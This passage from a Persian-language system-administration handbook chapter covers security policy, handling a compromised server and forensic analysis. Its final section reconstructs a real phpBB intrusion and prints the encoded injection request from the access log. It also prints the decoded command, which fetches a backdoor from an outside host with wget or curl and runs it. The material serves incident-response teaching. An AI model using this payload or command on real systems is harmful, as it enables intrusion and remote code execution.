      <para>در دنیای نرم‌افزار آزاد، انتخاب‌های زیادی وجود دارد و انتخاب یک نرم‌افزار در مقایسه با دیگری بستگی به کاربرد آن در فضای محلی دارد. ویژگی‌های بیشتر اغلب به معنی وجود آسیب‌پذیری‌های بیشتر در کد برنامه هستند؛ انتخاب پیشرفته‌ترین برنامه برای انجام یک کار ممکن است سودمند نباشد و بهترین رویکرد آن است که برنامه‌ای متناسب با نیازهای واقعی انتخاب گردد.</para>

      <sidebar>
        <title><emphasis>واژگان</emphasis> Zero-Day Exploit</title>

	<para>پیشگیری از یک حمله <emphasis>zero-day exploit</emphasis> بسیار دشوار است؛ از این عبارت برای اشاره به آسیب‌پذیری استفاده می‌شود که هم اکنون برای توسعه‌‌دهندگان اصلی برنامه شناخته شده نیست.</para>
      </sidebar>
    </section>
    <section id="sect.managing-a-machine-as-a-whole">
      <title>مدیریت یک ماشین به صورت کلی</title>

      <para>اکثر توزیع‌های لینوکس به صورت پیشفرض چندین سرویس یونیکس و ابزارهای مرتبط با آن را نصب می‌کنند. در بسیاری از موارد، این سرویس‌ها و ابزارها با هدف اولیه مدیر سیستم از برپایی ماشین همخوانی ندارند. به عنوان یک توصیه عمومی در بحث امنیت، بهتر است که نرم‌افزارهای اضافی را حذف کرد. در حقیقت، در صورت وجود آسیب‌پذیری در یک سرویس غیرکاربری دیگر که می‌تواند به منظور دسترسی به کل سیستم استفاده شود، دلیلی برای ایمن‌سازی سرور FTP وجود ندارد.</para>

      <para>به همین دلیل، فایروال اغب طوری پیکربندی می‌شود که تنها به سرویس‌های عمومی اجازه ارسال ترافیک داده شود.</para>

      <para>رایانه‌های امروزی به اندازه‌ای قدرتمند هستند که اجازه میزبانی از چندین سرویس روی یک ماشین فیزیکی را فراهم می‌کنند. از نقطه نظر اقتصادی نیز چنین امکانی جالب است: تنها یک رایانه برای مدیریت، مصرف پایین انرژی و از این قبیل. از نقطه نظر امنیتی، اگرچه چنین انتخابی می‌تواند مشکل آفرین باشد. یک سرویس نفوذپذیر می‌تواند امنیت کل ماشین را به خطر اندازد، که منجر به نفوذپذیری سایر سرویس‌های میزبانی شده روی ماشین می‌گردد. این خطر می‌تواند با ایزوله‌کردن سرویس‌ها کاهش یابد. اینکار می‌تواند با استفاده از مجازی‌سازی (میزبانی از هر سرویس درون یک ماشین مجازی یا نگهدارنده) یا ترکیب AppArmor/SELinux (هر فرآیند پس‌زمینه از سرویس به صورت مجموعه‌ای جداگانه از مجوزها) انجام شود.</para>
    </section>
    <section id="sect.users-are-players">
      <title>کاربران به عنوان بازیکنان اصلی</title>

      <para>بحث و گفتگو درباره امنیت این ایده را متصور می‌شود که باید در مقابل خرابکاران ناشناس که در اینترنت پراکنده شده‌اند، محافظت بعمل آورد؛ اما حقیقتی که کمتر به آن توجه می‌شود خطراتی است که از داخل مجموعه نشات می‌گیرند: یک کارمند که در آستانه خروج از شرکت قرار دارد می‌تواند با دانلود پروژه‌های حساس آن‌ها را به رقیبان شرکت بفروشد، یک مدیر فروش بی‌توجه می‌تواند میزکار خود را در یک جلسه با افراد خارج از شرکت باز نگه دارد، یک کاربر دست و پا چلفتی می‌تواند به اشتباه یک دایرکتوری از فایل‌ها را پاک کند و مواردی از این قبیل.</para>

      <para>پاسخ به این خطرات می‌تواند شامل راهکارهای فنی باشد: به هیچ کاربری نباید بیش از اندازه نیازش مجوز دسترسی داد و نگهداری از فایل‌های پشتیبان یک ضرورت به حساب می‌آیند. اما در بسیاری موارد، محافظت در برار این خطرات با آموزش کاربران صورت می‌گیرد.</para>

      <sidebar>
        <title><emphasis>نگاه سریع</emphasis> <emphasis role="pkg">autolog</emphasis></title>

	<para>بسته <emphasis role="pkg">autolog</emphasis> شامل برنامه‌ای است که ارتباط کاربران غیرفعال را پس از یک بازه مشخص شده قطع می‌کند. همچنین می‌تواند فرآیندهای کاربر را پس از اتمام زمان کاری ایشان از بین ببرد، که اینکار از اجرای فرآیندهای پس‌زمینه کاربران پیشگیری می‌کند.</para>
      </sidebar>
    </section>
    <section id="sect.physical-security">
      <title>امنیت فیزیکی</title>

      <para>اگر از خود رایانه‌ها به صورت فیزیکی محافظت نگردد، دلیلی برای ایمن‌سازی سرویس‌ها و شبکه‌ها وجود ندارد. داده‌های مهم سزاوار این هستند که در هارد دیسک‌های how-swappable و به صورت آرایه‌های RAID ذخیره‌سازی شوند، چرا که هارد دیسک‌های معمولی در گذر زمان معبوب شده و موجودیت داده امری بسیار حیاتی است. اما اگر قرار باشد هر فردی بتواند وارد ساختمان شده، به اتاق سرور برود و با چندین هارد دیسک خارج گردد، قسمت مهمی از امنیت برقرار نشده است. چه کسی می‌تواند وارد اتاق سرور شود؟ آیا این دسترسی مانیتور می‌شود؟ زمانی که امنیت فیزیکی مورد بررسی و تحلیل قرار می‌گیرد، این پرسش‌ها باید مطرح شده و پاسخ داده شوند.</para>

      <para>امنیت فیزیکی همچنین شامل در نظر گرفتن خطراتی از قبیل آتش‌سوزی نیز می‌باشد. این خطر مشخص لزوم نگهداری رسانه پشتیبان در یک ساختمان دیگر را نشان می‌دهد، یا حداقل در یک صندوقچه ضد-آتش.</para>
    </section>
    <section>
      <title>مسئولیت قانونی</title>

      <para>یک مدیر سیستم، کم و بیش، مورد اعتماد کاربران سیستم و کاربران شبکه به صورت عمومی‌تر قرار می‌گیرد. آن‌ها باید از هرگونه غفلت که ممکن است افراد بدخواه مورد استفاده قرار دهند، پیشگیری کنند.</para>

      <para>مهاجمی که کنترل ماشین شما را در دست می‌گیرد از آن به عنوان یک پایگاه (که بنام ... شناخته می‌شود) استفاده می‌کند تا سایر اقدامات نابکارانه خود را انجام دهد که می‌تواند برای شما مشکل حقوقی ایجاد کند، چرا که این حملات از ماشین شما به شبکه صورت می‌گیرد، که شما را در این مورد مهاجم (یا همدست) در نظر می‌گیرند. در بسیاری موارد، مهاجم از سرور شما به عنوان یک relay برای ارسال اسپم استفاده می‌کند، که نباید تاثیر خیلی منفی داشته باشد (بجز اینکه با قرار گرفتن در فهرست‌های سیاه باعث می‌شود شما نتوانید ایمیل‌های قانونی خود را ارسال کنید)، اما در کل تجربه لذت‌بخشی نخواهد بود. در سایر موارد، مشکلات بیشتری می‌تواند از ماشین شما نشات گیرد، برای نمونه حملات dos. اینگونه حملات اغلب به کاهش سود تجاری منجر می‌شود، چرا که سرویس‌های قانونی از دسترس خارج می‌شوند و داده‌ها در معرض تخریب قرار می‌گیرند؛ گاهی اوقات این حملات منجر به هزینه‌های واقعی می‌شوند، چرا که شرکت مورد حمله قرار گرفته شده می‌تواند از شما شکایت کند. اگر یک نسخه غیرمجاز از یک اثر دارای کپی‌رایت درون سرورهای شما توزیع شود، می‌توان از آن شکایت کرد، همچنین سایر شرکت‌هایی که مجبور به انعقاد توافقات سطح سرویسی کرده باشند که در صورت حمله از طرف ماشین شما باید غرامت و جریمه پرداخت نمایند.</para>

      <para>زمانی که این اتفاقات می‌افتد، بی‌گناه جلوه دادن خود کافی نیست؛ حداقل باید ثابت کنید که مجموعه فعالیت‌های مشکوکی از یک نشانی IP دیگر در سیستم شما انجام می‌شده است. اگر از توصیه‌های مطرح شده در این فصل چشم‌پوشی کرده باشید و به مهاجم اجازه ورود به سیستم و دسترسی به حساب کاربری مدیر (root در این مورد) را بدهید تا بتواند ردپای خود را بپوشاند، اینکار دیگر لزومی ندارد.</para>
    </section>
  </section>
  <section id="sect.dealing-with-compromised-machine">
    <title>مواجهه با یک ماشین نفوذپذیر</title>

    <para>برخلاف طراحی خوب یک خط مشی امنیتی، یک مدیر سیستم معمولا با یک عمل hijacking مواجه می‌شود. این قسمت به بررسی مواردی می‌پردازد که در مواجهه با چنین شرایط نامطلوبی باید مد نظر قرار گرفته شوند.</para>
    <section>
      <title>شناسایی و مشاهده نفوذ خرابکار</title>

      <para>اولین گام در مواجهه با یک نفوذ، شناسایی چنین اقدامی است. اینکار به راحتی صورت نمی‌پذیرد، به خصوص اگر زیرساخت مناسب مانیتورینگ موجود نباشد.</para>

      <para>اقدامات خرابکارانه مادامی که تاثیر منفی خود را روی سرویس‌های یک ماشین نگذارند قابل شناسایی نیستند، از جمله کاهش سرعت ارتباطات، قطع ارتباط برخی کاربران با سیستم یا هر گونه عیب و ایراد دیگر. در مواجهه با این مشکلات، مدیر سیستم باید با نگاهی دقیق به ماشین به بررسی آنچه درست عمل نمی‌کند بپردازد. این مورد زمانی اتفاق می‌افتد که یک فرآیند غیرمعمول در سیستم مشاهده شود، برای نمونه <literal>apache</literal> بجای فرآیند استاندارد <literal>/usr/sbin/apache2</literal>. با دنبال کردن این مثال، کاری که باید انجام داد یادداشت برداری از شناسه فرآیند مذکور و بررسی <filename>/proc/<replaceable>pid</replaceable>/exe</filename> به منظور اینکه فرآیند قصد اجرای کدام برنامه را داشته است:</para>

      <screen>
<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>
<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>
      </screen>

      <para>برنامه‌ای که در <filename>/var/tmp/</filename> نصب شده و به عنوان سرور وب کار می‌کند؟ بدون شک، ماشین مورد نفوذ قرار گرفته است.</para>

      <para>این تنها یک مثال بود، اما شواهد بسیاری وجود دارد که می‌تواند برای مدیر سیستم هشدار دهنده باشد:</para>
      <itemizedlist>
        <listitem>
	  <para>یک گزینه برای دستوری که هم اکنون کار نمی‌کند؛ نسخه نرم‌افزاری که دستور ادعای آن را می‌کند با نسخه‌ای که از <command>dpkg</command> پرس و جو شده است سازگاری ندارد؛</para>
        </listitem>
        <listitem>
	  <para>یک خط فرمان یا پیام خوش‌آمدگویی که بیان می‌کند آخرین ارتباط برقرار شده از یک قاره دیگر بوده است؛</para>
        </listitem>
        <listitem>
	  <para>خطاهایی که از پر شدن پارتیشن <filename>/tmp/</filename> به دلیل وجود نسخه‌های غیرقانونی از فیلم‌های مختلف تولید شده است؛</para>
        </listitem>
        <listitem>
	  <para>و از این قبیل.</para>
        </listitem>
      </itemizedlist>
    </section>
    <section>
      <title>خاموش کردن سرور</title>

      <para>در اکثر موارد، مهاجم از طریق یک شبکه به ماشین نفوذ کرده است و برای ادامه نفوذ خود به یک شبکه فعال نیاز دارد (به منظور دسترسی به داده‌های محرمانه، اشتراک‌گذاری فایل‌های غیرقانونی، پنهان‌سازی هویت خود با تبدیل ماشین به یک relay و از این قبیل). قطع ارتباط فیزیکی رایانه با شبکه از دسترسی بیشتر مهاجم به سیستم‌های هدف پیشگیری می‌کند، اگر تاکنون به این مهم دست نیافته باشد.</para>

      <para>اینکار تنها در صورت دسترسی فیزیکی به سرور ممکن است. زمانی که سرور در یک مرکز داده سرویس میزبانی درون کشور قرار گرفته یا به هر دلیل دیگر قابل دسترس نباشد، ایده خوبی است که اطلاعات بیشتری در این مورد جمع‌آوری (<xref linkend="sect.keeping-everything-that-could-be-used-as-evidence" />، <xref linkend="sect.forensic-analysis" /> و <xref linkend="sect.reconstituting-the-attack-scenario" /> را مشاهده کنید)، سپس تا آنجا که امکان دارد سرور را با استفاده از خاموش کردن سرویس‌های ممکن ایزوله کنیم (معمولا، همه سرویس‌ها بجز <command>sshd</command>). این مورد نیز مشکلات خود را دارد، چون کسی نمی‌تواند بگوید آیا مهاجم نیز مانند مدیر سیستم دسترسی SSH را بدست گرفته است یا خیر: اینکار “پاکسازی” ماشین را دشوارتر می‌سازد.</para>
    </section>
    <section id="sect.keeping-everything-that-could-be-used-as-evidence">
      <title>نگهداری هر آنچه که می‌تواند به عنوان مدرک استفاده شود</title>

      <para>درک حمله و/یا اقدامات قانونی مقابل مهاجمین نیازمند نسخه‌برداری از مهم‌ترین عناصر حمله می‌باشد؛ این فهرست شامل محتوای هارد دیسک، فهرستی از تمام فرآیندهای اجرایی و فهرستی از تمام ارتباطات باز می‌باشد. از محتوای موجود در RAM نیز می‌توان استفاده کرد ولی به ندرت در دنیای واقعی کاربرد دارد.</para>

      <para>در زمان وقوع حادثه، مدیر سیستم‌ها اغلب وسوسه می‌شند که بررسی‌های بسیاری را روی ماشین نفوذی انجام دهند؛ اینکار معمولا ایده خوبی نیست. هر دستوری که اجرا می‌شود به احتمال زیاد دستکاری شده است و ممکن است بخشی از شواهد را از بین ببرد. این بررسی‌ها باید محدود به مجموعه کوچکی شوند (<command>netstat -tupan</command> برای ارتباطات شبکه، <command>ps auxf</command> برای فهرستی از فرآیندها و <command>ls -alR /proc/[0-9]*</command> برای اطلاعات بیشتر در مورد برنامه‌های در حال اجرا) و هرگونه بررسی انجام شده باید یادداشت گردد.</para>

      <sidebar>
        <title><emphasis>احتیاط</emphasis> بررسی و تحلیل داغ</title>

	<para>با اینکه بررسی سیستم در حال اجرا یک امر قابل اجرا است، به خصوص زمانی که سرور به صورت فیزیکی قابل دسترس نباشد، بهتر است که از اینکار خودداری کنیم: به سادگی نمی‌توان از صحت برنامه‌های نصب شده روی سیستم اطمینان حاصل کرد. این امکان وجود دارد که یک دستور <command>ps</command> دستکاری شده برخی فرآیندها را نشان ندهد، یا یک دستور <command>ls</command> دستکاری شده برخی فایل‌ها را پنهان سازد؛ گاهی اوقات حتی کرنل نیز مورد نفوذ قرار می‌گیرد!</para>

	<para>اگر هنوز نیاز به چنین بررسی و تحلیلی باشد، باید احتیاط کرد که تنها از برنامه‌های شناخته شده استفاده کنیم. یک روش خود استفاده از دیسک نجاتی است که شامل برنامه‌های تر و تازه باشد، یا یک اشتراک شبکه فقط خواندنی. با این حال، حتی این اقدامات نیز در صورت نفوذ به کرنل بی‌فایده خواهند بود.</para>
      </sidebar>

      <para>زمانی که این عنصرهای ... ذخیره‌سازی شوند، گام بعدی ذخیره‌سازی یک تصویر کامل از هارد-دیسک است. ایجاد چنین تصویری در صورت تغییر اندازه فایل سیستم غیرممکن است، به همین دلیل است که ابتدا باید به صورت فقط-خواندنی متصل گردد. ساده‌ترین راهکار توقف اجباری سرور (پس از اجرای <command>sync</command>) و اجرای مجدد آن روی یک دیسک نجات است. هر پارتیشن باید با ابزاری مانند <command>dd</command> رونوشت گرفته شود؛ این تصاویر می‌توانند به سرور دیگری فرستاده شوند (احتمالا با ابزار <command>nc</command>). احتمال دیگر حتی از این نیز ساده‌تر است: تنها کافی است دیسک را از ماشین خارج کرده و با یک دیسک جدید جایگزین کنیم تا بتوان عملیات فرمت‌دهی و نصب مجدد را انجام داد.</para>
    </section>
    <section>
      <title>نصب مجدد</title>
      <indexterm><primary>backdoor</primary></indexterm>

      <para>قبل از اجرای نصب مجدد، سرور نباید به حالت آنلاین بازگردد. اگر نفوذ در بالاترین سطح اتفاق افتاده باشد (یعنی تمام دسترسی‌های مدیریتی) تقریبا هیچ راهی وجود ندارد تا اطمینان یابیم مهاجم چه ابزارهایی را در سرور باقی گذاشته است (به طور مشخص <emphasis>backdoor</emphasis>). البته، تمام بروزرسانی‌های امنیتی اخیر نیز به منظور مقابله با آسیب‌پذیری که مهاجم از آن سواستفاده کرده است باید انجام شوند. ایده‌آل است که بررسی و تحلیل حمله به این عامل مهم توجه کند، تا بتوان آن را در ادامه برطرف نمود؛ در غیر اینصورت، باید امیدوار باشیم که این آسیب‌پذیری یکی از همان مواردی بوده است که توسط بروزرسانی امنیتی برطرف شده است.</para>

      <para>نصب مجدد یک سرور راه‌دور همیشه آسان نیست؛ ممکن است به کمک شرکت میزبانی احتیاج باشد، زیرا همه این شرکت‌ها دارای سیستم‌های نصب مجدد خودکار نیستند. باید احتیاط کرد که از فایل‌های پشتیبان تهیه شده پس از نفوذ برای بازیابی ماشین استفاده نشود. ایده‌آل است که تنها داده‌ها را بازیابی کنیم و تمام نرم‌افزارهای کاربردی از نو نصب شوند.</para>
    </section>
    <section id="sect.forensic-analysis">
      <title>بررسی و تحلیل قضایی</title>

      <para>اکنون که سرویس‌ها به حالت قبلی خود بازگشته‌اند، زمان آن فرا رسیده است که نگاهی عمیق‌تر به تصاویر ذخیره شده از دیسک‌های مورد نفوذ قرار گرفته شده بیندازیم تا عامل حمله را بهتر درک کنیم. زمانی که قصد استفاده از این تصاویر را داریم، باید احتیاط کرد که تنها از گزینه‌های <literal>ro,nodev,noexec,noatime</literal> به منظور پیشگیری از دستکاری محتوای دیسک (از جمله زمان دسترسی به فایل‌ها) یا اجرایی اشتباهی برنامه‌ها استفاده کنیم.</para>

      <para>پیگیری یک سناریوی حمله معمولا شامل جستجو برای هر آنچه تغییر یافته یا اجرا شده است می‌باشد:</para>
      <itemizedlist>
        <listitem>
	  <para>فایل‌های <filename>.bash_history</filename> اغلب اطلاعات مفیدی را فراهم می‌کنند؛</para>
        </listitem>
        <listitem>
	  <para>به همین صورت فهرست فایل‌هایی که اخیرا ایجاد، تغییر یا دسترسی یافته‌اند؛</para>
        </listitem>
        <listitem>
	  <para>دستور <command>strings</command>، با استخراج رشته‌های متنی از یک فایل باینری، به شناسایی برنامه‌های نصب شده توسط مهاجم کمک می‌کند؛</para>
        </listitem>
        <listitem>
	  <para>فایل‌های گزارش موجود در <filename>/var/log/</filename> اغلب ساختار زمانی و ترتیب اجرای وقایع را شرح می‌دهند؛</para>
        </listitem>
        <listitem>
	  <para>ابزارهای خاص-منظوره همچنین امکان بازیابی محتوای فایل‌های حذف شده را فراهم می‌کنند، از جمله فایل‌های گزارشی که مهاجم آن‌ها را پاک کرده است.</para>
        </listitem>
      </itemizedlist>

      <para>برخی از این عملیات می‌توانند با استفاده از یک نرم‌افزار اختصاصی ساده‌سازی گردند. به طور مشخص، بسته <emphasis role="pkg">sleuthkit</emphasis> ابزارهای بسیاری را برای بررسی یک فایل سیستم فراهم می‌کند. کاربرد آن‌ها با استفاده از رابط گرافیکی <emphasis>Autopsy Forensic Browser</emphasis> (در بسته <emphasis role="pkg">autopsy</emphasis>) بسیار ساده شده است.</para>
      <indexterm><primary>Autopsy Forensic Browser</primary></indexterm>
      <indexterm><primary>The Sleuth Kit</primary></indexterm>
    </section>
    <section id="sect.reconstituting-the-attack-scenario">
      <title>بازسازی سناریوی حمله</title>

      <para>تمام عنصرهای جمع‌آوری شده حین بررسی و تحلیل باید به صورت قطعه‌های یک پازل کنار یکدیگر قرار گیرند؛ ایجاد اولین فایل‌ها مشکوک اغلب مرتبط با گزارش‌های مربوط به نفوذ می‌باشد. یک مثال واقعی می‌تواند منظور را بهتر از مفاهیم نظری طولانی منتقل کند.</para>

      <para>گزارش پیش رو از یک فایل <filename>access.log</filename> آپاچی استخراج شده است:</para>

      <programlisting>
www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
      </programlisting>

      <para>این مثال با یک آسیب‌پذیری قدیمی در نرم‌افزار phpBB سازگاری دارد. <ulink type="block" url="http://secunia.com/advisories/13239/" /> <ulink type="block" url="http://www.phpbb.com/phpBB/viewtopic.php?t=240636" /></para>

      <para>رمزگشایی این نشانی طولانی باعث می‌شود درک بهتری از قصد مهاجم از اجرای کد PHP را داشته باشیم که برابر است با: <command>system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &amp;")</command>. در حقیقت، یک فایل <filename>bd</filename> در <filename>/tmp/</filename> پیدا شده است. اجرای <command>strings /mnt/tmp/bd</command> در میان سایر رشته‌ها عبارت <literal>PsychoPhobia Backdoor is starting...</literal> را باز می‌گرداند. این ابزار شباهت زیادی به یک backdoor دارد.</para>

      <para>در زمان دیگری، از این دسترسی به منظور دانلود، نصب و اجرای یک <emphasis>bot</emphasis> از نوع IRC که به یک شبکه زیرزمینی متصل شده بود، استفاده می‌شد. این ربات از طریق این پروتکل قابل کنترل بود که باعث می‌شد بتواند فایل‌های گوناگونی را به منظور اشتراک‌گذاری دانلود کند. این برنامه حتی فایل گزارش مخصوص به خود را دارد:</para>

      <programlisting>** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
** 2004-11-29-19:50:20: DCC CHAT Correct password
(...)
** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
(...)
** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
(...)
** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
(...)
** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)</programlisting>

      <para>این فایل نشان می‌دهد که دو فایل ویدیویی با استفاده از نشانی IP 82.50.72.202 روی سرور ذخیره‌سازی شده‌اند.</para>

      <para>به صورت موازی، مهاجم اقدام به دانلود چند فایل اضافی کرده است، <filename>/tmp/pt</filename> و <filename>/tmp/loginx</filename>. اجرای <command>strings</command> روی این دو برنامه عبارت‌های <foreignphrase>Shellcode placed at 0x%08lx</foreignphrase> و <foreignphrase>Now wait for suid shell...</foreignphrase> را باز می‌گرداند. این‌ها مانند برنامه‌هایی هستند که با استفاده از آسیب‌پذیری‌های محلی قصد اتخاذ دسترسی‌های سطح بالاتر را دارند. آیا به هدف خود رسیده‌اند؟ در این مورد، احتمالا خیر، چرا که پس از نفوذ اولیه به سیستم هیچ فایل دیگری تغییر نیافته است.</para>

      <para>در این مثال، تمام حمله بازسازی شده است و می‌توان نتیجه گرفت که مهاجم به مدت سه روز کنترل سیستم را در دست داشته است؛ اما مهم‌ترین عنصر در این حمله آن است که آسیب‌پذیری شناسایی شده است و مدیر سیستم می‌تواند اطمینان یابد که با نصب بروزرسانی امنیتی آن را برطرف کرده است.</para>
    </section>
  </section>
</chapter>
